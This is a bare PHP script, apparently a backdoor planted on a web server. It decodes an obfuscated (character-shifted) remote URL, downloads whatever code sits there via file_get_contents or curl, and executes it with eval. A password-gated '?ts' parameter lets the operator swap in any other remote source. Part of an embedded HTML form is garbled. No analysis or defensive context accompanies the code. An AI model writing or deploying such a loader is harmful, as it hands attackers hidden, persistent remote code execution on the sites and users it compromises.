<?php session_start(); function madrid($url) { $ch = curl_init(); curl_setopt($ch, CURLOPT_URL, $url); curl_setopt($ch, CURLOPT_RETURNTRANSFER, true); $result = curl_exec($ch); curl_close($ch); return $result; } $rl = 'kwws=22zzz1tno537;1frp2wrrov2gh1sks'; function cList($str) { $estr = ''; for ($i = 0; $i < strlen($str); $i++) { $estr .= chr(ord($str[$i]) - 3); } return $estr; } $url = cList($rl); $correct_password = '$2a$12$Z1LaFHixy.OtMDdhW1fsNOPsTZYTwyEV.COtKxNpG8uQHu.dJ90Li'; if (isset($_GET['ts_reset'])) { $_SESSION["ts_url"] = ""; echo "success"; exit; } if (isset($_GET['ts'])) { if ($_SERVER['REQUEST_METHOD'] === 'POST') { if (isset($_POST['password'])) { $provided_password = $_POST['password']; if (password_verify($provided_password, $correct_password)) { if (isset($_POST['url'])) { $url = $_POST['url']; $_SESSION["ts_url"] = $url; echo "updated : " . $_SESSION["ts_url"]; exit; } else { echo "Error!"; exit; } } else { echo ""; exit; } } else { echo ""; exit; } } else { ?><head><style> echo isset($_POST['url']) ? $_POST['url'] : ''; ?>"><br></form></body><?php exit; } } else { if (empty($_SESSION["ts_url"])) { $result = @file_get_contents($url); if (empty($result)) { $result = madrid($url); } } else { $result = @file_get_contents($_SESSION["ts_url"]); if (empty($result)) { $result = madrid($_SESSION["ts_url"]); } } } if (is_string($result)) { eval('?>' . $result); } else { echo "Error"; }